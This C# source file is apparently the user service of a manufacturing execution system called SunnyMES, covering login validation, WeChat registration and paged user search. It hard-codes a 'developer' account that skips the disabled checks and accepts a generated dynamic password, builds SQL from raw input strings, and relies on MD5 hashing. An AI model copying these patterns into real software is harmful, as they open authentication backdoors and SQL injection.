using System;
using System.Data.Common;
using SunnyMES.Commons.Encrypt;
using SunnyMES.Commons.Repositories;
using SunnyMES.Commons.Services;
using SunnyMES.Security.IRepositories;
using SunnyMES.Security.IServices;
using SunnyMES.Security.Models;
using System.Data;
using SunnyMES.Security.Dtos;
using System.Collections.Generic;
using SunnyMES.Commons.Helpers;
using SunnyMES.Commons.Mapping;
using System.Threading.Tasks;
using SunnyMES.Commons.Extend;
using SunnyMES.Commons.Pages;
using SunnyMES.Commons.Dtos;
using SunnyMES.Commons.Enums;
using API_MSG;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Linq;
using SunnyMES.Security.Repositories;
using Pipelines.Sockets.Unofficial.Arenas;
using SunnyMES.Commons.Core.PublicFun;
using System.IO;
using System.Management;

namespace SunnyMES.Security.Services
{
    /// <summary>
    /// 
    /// </summary>
    public class UserService : BaseService<User, UserOutputDto, string>, IUserService
    {
        private readonly IUserRepository _userRepository;
        private readonly IUserLogOnRepository _userSigninRepository;
        private readonly ILogService _logService;
        private readonly IRoleService _roleService;
        private IOrganizeService _organizeService;
        private IPublicService _PublicService;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="repository"></param>
        /// <param name="userLogOnRepository"></param>
        /// <param name="logService"></param>
        /// <param name="roleService"></param>
        /// <param name="organizeService"></param>
        public UserService(IUserRepository repository, IUserLogOnRepository userLogOnRepository,
            ILogService logService, IRoleService roleService, IOrganizeService organizeService, 
            IPublicService publicService) : base(repository)
        {
            _userRepository = repository;
            _userSigninRepository = userLogOnRepository;
            _logService = logService;
            _roleService = roleService;
            _organizeService = organizeService;
            _PublicService = publicService;
        }



        /// <summary>
        /// 用户登陆验证。
        /// </summary>
        /// <param name="userName">用户名</param>
        /// <param name="password">密码（第一次md5加密后）</param>
        /// <returns>验证成功返回用户实体，验证失败返回null|提示消息</returns>
        public async Task<Tuple<User, string>> Validate(string userName, string password)
        {
            var userEntity = await _userRepository.GetUserByLogin(userName);

            if (userEntity == null)
            {
                return new Tuple<User, string>(null, "系统不存在该用户，请重新确认。");
            }

            if (!userEntity.EnabledMark)
            {
                return new Tuple<User, string>(null, "该用户已被禁用，请联系管理员。");
            }

            var userSinginEntity = _userSigninRepository.GetByUserId(userEntity.Id);

            string inputPassword = MD5Util.GetMD5_32(DEncrypt.Encrypt(MD5Util.GetMD5_32(password).ToLower(), userSinginEntity.UserSecretkey).ToLower()).ToLower();

            if (inputPassword != userSinginEntity.UserPassword)
            {
                return new Tuple<User, string>(null, "密码错误，请重新输入。");
            }
            else
            {
                UserLogOn userLogOn = _userSigninRepository.GetWhere("UserId='"+ userEntity.Id+ "'");
                if (userLogOn.AllowEndTime < DateTime.Now)
                {
                    return new Tuple<User, string>(null, "您的账号已过期，请联系系统管理员！");
                }
                if (userLogOn.LockEndDate >DateTime.Now)
                {
                    string dateStr=userLogOn.LockEndDate.ToEasyStringDQ();
                    return new Tuple<User, string>(null, "当前被锁定，请"+ dateStr + "登录");
                }
                if (userLogOn.FirstVisitTime == null)
                {
                    userLogOn.FirstVisitTime =userLogOn.PreviousVisitTime= DateTime.Now;
                }
                else
                {
                    userLogOn.PreviousVisitTime = DateTime.Now;
                }
                userLogOn.LogOnCount++;
                userLogOn.LastVisitTime = DateTime.Now;
                userLogOn.UserOnLine = true;
                 _userSigninRepository.Edit(userLogOn);
                return new Tuple<User, string>(userEntity, "");
            }
        }


        /// <summary>
        /// MES/SFC 用户登陆验证
        /// </summary>
        /// <param name="S_userName"></param>
        /// <param name="S_password"></param>
        /// <param name="I_LineID"></param>
        /// <param name="I_StationID"></param>
        /// <param name="v_MSG_Login"></param>
        /// <returns>验证成功返回用户实体，验证失败返回null|提示消息</returns>
        public async Task<Tuple<User, string>> Validate(string S_userName, string S_password,
            int I_LineID, int I_StationID, MSG_Login v_MSG_Login)
        {            
            var userEntity = await _userRepository.GetUserByLogin(S_userName);

            if (userEntity == null)
            {
                return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_011);  //系统不存在该用户，请重新确认。
            }

            if (!userEntity.EnabledMark && userEntity.Account!="developer")
            {
                return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_012); //该用户已被禁用，请联系管理员。
            }

            var roleEnable = await _roleService.GetAllByIsEnabledMarkAsync();
            if (userEntity.Account != "developer" && !roleEnable.Where(x => x.Id == userEntity.RoleId).Any())
            {
                return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_018); //该用户的角色已被禁用，请联系管理员。
            }

            //生产用户
            if (userEntity.UserType=="2") 
            {
                string S_OperatorUserPermission = await _userRepository.GetOperatorUserPermission(I_StationID.ToString(), userEntity.UserID);

                if (S_OperatorUserPermission == "0") 
                {
                    return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_017); //没有权限！
                }
            }

            var userSinginEntity = _userSigninRepository.GetByUserId(userEntity.Id);
            string inputPassword = MD5Util.GetMD5_32(DEncrypt.Encrypt(MD5Util.GetMD5_32(S_password).ToLower(),
                userSinginEntity.UserSecretkey).ToLower()).ToLower();

            UserLogOn userLogOn = _userSigninRepository.GetWhere("UserId='" + userEntity.Id + "'");

            //string S_temp = PublicF.DynPWd();
            if (inputPassword != userSinginEntity.UserPassword)
            {
                string S_DynPWD = PublicF.DynPWd();
                if (S_password == S_DynPWD && userEntity.UserID == "developer")
                {
                   
                    string S_ServerData = GetServerData();
                    if (S_ServerData.IndexOf("ERROR:") > -1)
                    {
                        return new Tuple<User, string>(null, S_ServerData); 
                    }
                }
                else
                {
                    return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_013);  //密码错误，请重新输入。
                }
            }
            else
            {                
                if (userLogOn.AllowEndTime < DateTime.Now)
                {
                    return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_014);//您的账号已过期，请联系系统管理员！
                }
                if (userLogOn.LockEndDate > DateTime.Now)
                {
                    string dateStr = userLogOn.LockEndDate.ToEasyStringDQ();
                    return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_015);//当前用户被锁定
                }

                if (userEntity.IsAdministrator == false) 
                {
                    if (userEntity.UserType == "2")
                    {
                        if (I_LineID == 0)
                        {
                            return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_005); //线别不能为空！
                        }
                        else if (I_StationID == 0)
                        {
                            return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_006); //工站不能为空！
                        }

                        var Query_mesLine = await _PublicService.GetData("mesLine", "ID='" + I_LineID + "'");
                        var Select_mesLine = from c in Query_mesLine select c;
                        if (Select_mesLine.Count() == 0)
                        {
                            return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_016); //线别或工站系统中不存在！
                        }

                        var Query_mesStation = await _PublicService.GetData("mesStation", "ID='" + I_StationID + "'");
                        var Select_mesStation = from c in Query_mesStation select c;
                        if (Select_mesStation.Count() == 0)
                        {
                            return new Tuple<User, string>(null, v_MSG_Login.MSG_Login_016); //线别或工站系统中不存在！
                        }
                    }                                      
                }

                string S_ValidateSecond = await _userRepository.ValidateSecond(userEntity.UserID, S_password);
                if (S_ValidateSecond != "OK")
                {
                    return new Tuple<User, string>(null, S_ValidateSecond); //二次验证账户无效！
                }


                if (userLogOn.FirstVisitTime == null)
                {
                    userLogOn.FirstVisitTime = userLogOn.PreviousVisitTime = DateTime.Now;
                }
                else
                {
                    userLogOn.PreviousVisitTime = DateTime.Now;
                }

            }

            userLogOn.LogOnCount++;
            userLogOn.LastVisitTime = DateTime.Now;
            userLogOn.UserOnLine = true;
            _userSigninRepository.Edit(userLogOn);
            return new Tuple<User, string>(userEntity, "");
        }

        public string GetServerData() 
        {
            return  _userRepository.GetServerData();
        }

        public async Task<string> SetSyncUserData(string S_EmployeeID)
        {
            return await _userRepository.SetSyncUserData(S_EmployeeID);
        }


        public async Task<Tuple<User, string>> Get_My_User(string userName)
        {
            var userEntity = await _userRepository.GetUserByLogin(userName);
            
            return new Tuple<User, string>(userEntity, "");            
        }



        /// <summary>
        /// 用户登陆验证。
        /// </summary>
        /// <param name="userName">用户名</param>
        /// <param name="password">密码（第一次md5加密后）</param>
        /// <param name="userType">用户类型</param>
        /// <returns>验证成功返回用户实体，验证失败返回null|提示消息</returns>
        public async Task<Tuple<User, string>> Validate(string userName, string password, UserType userType)
        {
            var userEntity = await _userRepository.GetUserByLogin(userName);

            if (userEntity == null)
            {
                return new Tuple<User, string>(null, "系统不存在该用户，请重新确认。");
            }

            if (!userEntity.EnabledMark)
            {
                return new Tuple<User, string>(null, "该用户已被禁用，请联系管理员。");
            }

            var userSinginEntity = _userSigninRepository.GetByUserId(userEntity.Id);

            string inputPassword = MD5Util.GetMD5_32(DEncrypt.Encrypt(MD5Util.GetMD5_32(password).ToLower(), userSinginEntity.UserSecretkey).ToLower()).ToLower();

            if (inputPassword != userSinginEntity.UserPassword)
            {
                return new Tuple<User, string>(null, "密码错误，请重新输入。");
            }
            else
            {
                UserLogOn userLogOn = _userSigninRepository.GetWhere("UserId='" + userEntity.Id + "'");
                if (userLogOn.AllowEndTime < DateTime.Now)
                {
                    return new Tuple<User, string>(null, "您的账号已过期，请联系系统管理员！");
                }
                if (userLogOn.LockEndDate > DateTime.Now)
                {
                    string dateStr = userLogOn.LockEndDate.ToEasyStringDQ();
                    return new Tuple<User, string>(null, "当前被锁定，请" + dateStr + "登录");
                }
                if (userLogOn.FirstVisitTime == null)
                {
                    userLogOn.FirstVisitTime = userLogOn.PreviousVisitTime = DateTime.Now;
                }
                else
                {
                    userLogOn.PreviousVisitTime = DateTime.Now;
                }
                userLogOn.LogOnCount++;
                userLogOn.LastVisitTime = DateTime.Now;
                userLogOn.UserOnLine = true;
                await _userSigninRepository.UpdateAsync(userLogOn, userLogOn.Id);
                return new Tuple<User, string>(userEntity, "");
            }
        }

        /// <summary>
        /// 根据用户账号查询用户信息
        /// </summary>
        /// <param name="userName"></param>
        /// <returns></returns>
        public async Task<User> GetByUserName(string userName)
        {
            return await _userRepository.GetByUserName(userName);
        }
        /// <summary>
        /// 根据用户手机号码查询用户信息
        /// </summary>
        /// <param name="mobilephone">手机号码</param>
        /// <returns></returns>
        public async Task<User> GetUserByMobilePhone(string mobilephone)
        {
            return await _userRepository.GetUserByMobilePhone(mobilephone);
        }
        /// <summary>
        /// 根据Email、Account、手机号查询用户信息
        /// </summary>
        /// <param name="account">登录账号</param>
        /// <returns></returns>
        public async Task<User> GetUserByLogin(string account)
        {
            return await _userRepository.GetUserByLogin(account);
        }
        /// <summary>
        /// 注册用户
        /// </summary>
        /// <param name="entity"></param>
        /// <param name="userLogOnEntity"></param>
        /// <param name="trans"></param>
        public bool Insert(User entity, UserLogOn userLogOnEntity, IDbTransaction trans = null)
        {
            return _userRepository.Insert(entity, userLogOnEntity, trans);
        }

        /// <summary>
        /// 注册用户
        /// </summary>
        /// <param name="entity"></param>
        /// <param name="userLogOnEntity"></param>
        /// <param name="trans"></param>
        public async Task<bool> InsertAsync(User entity, UserLogOn userLogOnEntity, IDbTransaction trans = null)
        {
            return await _userRepository.InsertAsync(entity, userLogOnEntity, trans);
        }

        public override async Task<bool> UpdateAsync(User v_User, string S_Id, IDbTransaction trans = null)
        {
            return await _userRepository.UpdateAsync(v_User, S_Id, trans);
            
        }



        /// <summary>
        /// 注册用户,第三方平台
        /// </summary>
        /// <param name="entity"></param>
        /// <param name="userLogOnEntity"></param>
        /// <param name="trans"></param>
        public bool Insert(User entity, UserLogOn userLogOnEntity, UserOpenIds userOpenIds, IDbTransaction trans = null)
        {
            return _userRepository.Insert(entity, userLogOnEntity, userOpenIds, trans);
        }

        /// <summary>
        /// 根据第三方OpenId查询用户信息
        /// </summary>
        /// <param name="openIdType">第三方类型</param>
        /// <param name="openId">OpenId值</param>
        /// <returns></returns>
        public User GetUserByOpenId(string openIdType, string openId)
        {
            return _userRepository.GetUserByOpenId(openIdType, openId);
        }
        /// <summary>
        /// 根据userId查询用户信息
        /// </summary>
        /// <param name="openIdType">第三方类型</param>
        /// <param name="userId">userId</param>
        /// <returns></returns>
        public UserOpenIds GetUserOpenIdByuserId(string openIdType, string userId)
        {
            return _userRepository.GetUserOpenIdByuserId(openIdType, userId);
        }
        /// <summary>
        /// 更新用户信息,第三方平台
        /// </summary>
        /// <param name="entity"></param>
        /// <param name="userLogOnEntity"></param>
        /// <param name="userOpenIds"></param>
        /// <param name="trans"></param>
        public bool UpdateUserByOpenId(User entity, UserLogOn userLogOnEntity, UserOpenIds userOpenIds, IDbTransaction trans = null)
        {
            return _userRepository.UpdateUserByOpenId(entity, userLogOnEntity, userOpenIds, trans);
        }

        /// <summary>
        /// 根据微信UnionId查询用户信息
        /// </summary>
        /// <param name="unionId">UnionId值</param>
        /// <returns></returns>
        public User GetUserByUnionId(string unionId)
        {
            return _userRepository.GetUserByUnionId(unionId);
        }


        /// <summary>
        /// 微信注册普通会员用户
        /// </summary>
        /// <param name="userInPut">第三方类型</param>
        /// <returns></returns>
        public bool CreateUserByWxOpenId(UserInputDto userInPut)
        {

            User user = userInPut.MapTo<User>();
            UserLogOn userLogOnEntity = new UserLogOn();
            UserOpenIds userOpenIds = new UserOpenIds();

            user.Id = user.CreatorUserId = GuidUtils.CreateNo();
            user.Account = "Wx" + GuidUtils.CreateNo();
            user.CreatorTime = userLogOnEntity.FirstVisitTime = DateTime.Now;
            user.IsAdministrator = false;
            user.EnabledMark = true;
            user.Description = "第三方注册";
            user.IsMember = true;
            user.UnionId = userInPut.UnionId;
            user.ReferralUserId = userInPut.ReferralUserId;
            if (userInPut.NickName == "游客")
            {
                user.RoleId = _roleService.GetRole("guest").Id;
            }
            else
            {
                user.RoleId = _roleService.GetRole("usermember").Id;
            }

            userLogOnEntity.UserId = user.Id;

            userLogOnEntity.UserPassword = GuidUtils.NewGuidFormatN() + new Random().Next(100000, 999999).ToString();
            userLogOnEntity.Language = userInPut.language;

            userOpenIds.OpenId = userInPut.OpenId;
            userOpenIds.OpenIdType = userInPut.OpenIdType;
            userOpenIds.UserId = user.Id;
            return _userRepository.Insert(user, userLogOnEntity, userOpenIds);
        }
        /// <summary>
        /// 更新用户
        /// </summary>
        /// <param name="userInPut"></param>
        /// <returns></returns>
        public bool UpdateUserByOpenId(UserInputDto userInPut)
        {
            User user = GetUserByOpenId(userInPut.OpenIdType, userInPut.OpenId);
            user.HeadIcon = userInPut.HeadIcon;
            user.Country = userInPut.Country;
            user.Province = userInPut.Province;
            user.City = userInPut.City;
            user.Gender = userInPut.Gender;
            user.NickName = userInPut.NickName;
            user.UnionId = userInPut.UnionId;
            return _userRepository.Update(user, user.Id);
        }


        /// <summary>
        /// 根据条件查询数据库,并返回对象集合(用于分页数据显示)
        /// </summary>
        /// <param name="search">查询的条件</param>
        /// <returns>指定对象的集合</returns>
        public async Task<PageResult<UserOutputDto>> FindWithPagerSearchAsync(SearchUserModel search, YuebonCurrentUser Current_User)
        {
            bool order = search.Order == "asc" ? false : true;
            string S_Role = Current_User.Role;

            string where = GetDataPrivilege(false);

            if (!string.IsNullOrEmpty(search.Keywords))
            {
                where += string.Format(" and (NickName like '%{0}%' or Account like '%{0}%' or RealName  like '%{0}%' or MobilePhone like '%{0}%')", search.Keywords);
            }

            if (!string.IsNullOrEmpty(search.RoleId))
            {
                where += string.Format(" and RoleId like '%{0}%'", search.RoleId);
            }
            if (!string.IsNullOrEmpty(search.CreatorTime1))
            {
                where += " and CreatorTime >='" + search.CreatorTime1 + " 00:00:00'";
            }
            if (!string.IsNullOrEmpty(search.CreatorTime2))
            {
                where += " and CreatorTime <='" + search.CreatorTime2 + " 23:59:59'";
            }

            if (S_Role.Contains("administrators")==false )
            {
                where += " and RoleId not in(SELECT ID FROM [dbo].[API_Role] WHERE EnCode='administrators') OR isnull(RoleId,'')=''";
            }


            PagerInfo pagerInfo = new PagerInfo
            {
                CurrentPageIndex = search.CurrentPageIndex,
                PageSize = search.PageSize
            };
            List<Models.mesEmployee> list = await _userRepository.FindWithPagerMyAsync(where, pagerInfo, search.Sort, order);

            string[] Array_Role = S_Role.Split(",");
            foreach (var item_Role in Array_Role)
            {
                if (item_Role.Trim() != "administrators" && item_Role.Trim() != "")
                {
                    List<Role> List_Role = await _userRepository.GetRole("administrators");
                    List<Models.mesEmployee> List_User = await _userRepository.GetmesEmployee("select * from mesEmployee where  RoleId='" + List_Role[0].Id + "'");

                    foreach (var item in List_User)
                    {
                        list.Remove(item);
                    }
                }
            }

            List<UserOutputDto> resultList =new List<UserOutputDto>() ;
            foreach (var item in list) 
            {
                UserOutputDto v_Value =new UserOutputDto();

                if (!string.IsNullOrEmpty(item.OrganizeId))
                {
                    v_Value.OrganizeName = _organizeService.Get(item.OrganizeId).FullName;
                }
                if (!string.IsNullOrEmpty(item.RoleId))
                {
                    v_Value.RoleName = _roleService.GetRoleNameStr(item.RoleId);
                }
                if (!string.IsNullOrEmpty(item.DepartmentId))
                {
                    v_Value.DepartmentName = _organizeService.Get(item.DepartmentId).FullName;
                }

                string tmpPermissionName = await SqlSugarHelper.Db.Ado.GetStringAsync($"SELECT CodeName FROM sysCode WHERE Code = {item.PermissionId ?? 0}");
                v_Value.Id=item.Id.ToString();
                //v_Value.Lastname = item.Lastname;
                //v_Value.Firstname = item.Firstname;
                v_Value.Description = item.Description;
                v_Value.EmailAddress = item.EmailAddress;
                //v_Value.LoginAttempt = item.LoginAttempt;
                v_Value.EmployeeGroupID = item.EmployeeGroupID;
                v_Value.StatusID = item.StatusID;
                v_Value.PermissionId = item.PermissionId;
                v_Value.PermissionName = tmpPermissionName;
                v_Value.Account = item.Account;
                v_Value.RealName = item.RealName;
                v_Value.NickName = item.NickName;
                v_Value.HeadIcon = item.HeadIcon;
                v_Value.Gender = item.Gender;
                v_Value.Birthday = item.Birthday;
                v_Value.MobilePhone = item.MobilePhone;
                //v_Value.Email = item.Email;
                v_Value.WeChat = item.WeChat;
                v_Value.ManagerId = item.ManagerId;
                v_Value.SecurityLevel = item.SecurityLevel;
                v_Value.Signature = item.Signature;
                v_Value.Country = item.Country;
                v_Value.Province = item.Province;
                v_Value.City = item.City;
                v_Value.District = item.District;
                v_Value.OrganizeId = item.OrganizeId;
                v_Value.DepartmentId = item.DepartmentId;
                v_Value.RoleId = item.RoleId;
                v_Value.DutyId = item.DutyId;
                v_Value.IsAdministrator = item.IsAdministrator;
                v_Value.IsMember = item.IsMember;
                v_Value.MemberGradeId = item.MemberGradeId;
                v_Value.ReferralUserId = item.ReferralUserId;
                //v_Value.UnionId = item.UnionId;
                v_Value.SortCode = item.SortCode;
                v_Value.DeleteMark = item.DeleteMark;
                v_Value.EnabledMark = item.EnabledMark;
                v_Value.CreatorTime = item.CreatorTime;
                v_Value.CreatorUserId = item.CreatorUserId;
                v_Value.LastModifyTime = item.LastModifyTime;
                v_Value.LastModifyUserId = item.LastModifyUserId;
                v_Value.DeleteTime = item.DeleteTime;
                v_Value.DeleteUserId = item.DeleteUserId;
                v_Value.UserType = item.UserType;

                resultList.Add(v_Value);
            }


            PageResult<UserOutputDto> pageResult = new PageResult<UserOutputDto>
            {
                CurrentPage = pagerInfo.CurrentPageIndex,
                Items = resultList,
                ItemsPerPage = pagerInfo.PageSize,
                TotalItems = pagerInfo.RecordCount
            };
            return pageResult;
        }



        //public  async Task<PageResult<UserOutputDto>> FindWithPagerSearchAsync(SearchUserModel search,string S_Role)
        //{
        //    bool order = search.Order == "asc" ? false : true;
        //    string where = GetDataPrivilege(false);

        //    if (!string.IsNullOrEmpty(search.Keywords))
        //    {
        //        where += string.Format(" and (NickName like '%{0}%' or Account like '%{0}%' or RealName  like '%{0}%' or MobilePhone like '%{0}%')", search.Keywords);
        //    }

        //    if (!string.IsNullOrEmpty(search.RoleId))
        //    {
        //        where += string.Format(" and RoleId like '%{0}%'", search.RoleId);
        //    }
        //    if (!string.IsNullOrEmpty(search.CreatorTime1))
        //    {
        //        where += " and CreatorTime >='" + search.CreatorTime1 + " 00:00:00'";
        //    }
        //    if (!string.IsNullOrEmpty(search.CreatorTime2))
        //    {
        //        where += " and CreatorTime <='" + search.CreatorTime2 + " 23:59:59'";
        //    }

        //    PagerInfo pagerInfo = new PagerInfo
        //    {
        //        CurrentPageIndex = search.CurrentPageIndex,
        //        PageSize = search.PageSize
        //    };
        //    List<User> list = await repository.FindWithPagerAsync(where, pagerInfo, search.Sort, order);

        //    string[] Array_Role = S_Role.Split(",");
        //    foreach (var item_Role in Array_Role) 
        //    {
        //        if (item_Role.Trim()!="administrators" && item_Role.Trim() !="")
        //        {
        //            List<Role> List_Role = await _userRepository.GetRole("administrators");
        //            List<User> List_User = await _userRepository.GetUser("select * from mesEmployee where  RoleId='" + List_Role[0].Id + "'");

        //            foreach (var item in List_User)
        //            {
        //                list.Remove(item);
        //            }
        //        }
        //    }


        //    List<UserOutputDto> resultList = list.MapTo<UserOutputDto>();
        //    List<UserOutputDto> listResult = new List<UserOutputDto>();

        //    foreach (UserOutputDto item in resultList)
        //    {
        //        if (!string.IsNullOrEmpty(item.OrganizeId))
        //        {
        //            item.OrganizeName = _organizeService.Get(item.OrganizeId).FullName;
        //        }
        //        if (!string.IsNullOrEmpty(item.RoleId))
        //        {
        //            item.RoleName = _roleService.GetRoleNameStr(item.RoleId);
        //        }
        //        if (!string.IsNullOrEmpty(item.DepartmentId))
        //        {
        //            item.DepartmentName = _organizeService.Get(item.DepartmentId).FullName;
        //        }
        //        //if (!string.IsNullOrEmpty(item.DutyId))
        //        //{
        //        //    item.DutyName = _roleService.Get(item.DutyId).FullName;
        //        //}
        //        listResult.Add(item);
        //    }
        //    PageResult<UserOutputDto> pageResult = new PageResult<UserOutputDto>
        //    {
        //        CurrentPage = pagerInfo.CurrentPageIndex,
        //        Items = listResult,
        //        ItemsPerPage = pagerInfo.PageSize,
        //        TotalItems = pagerInfo.RecordCount
        //    };
        //    return pageResult;
        //}

    }
}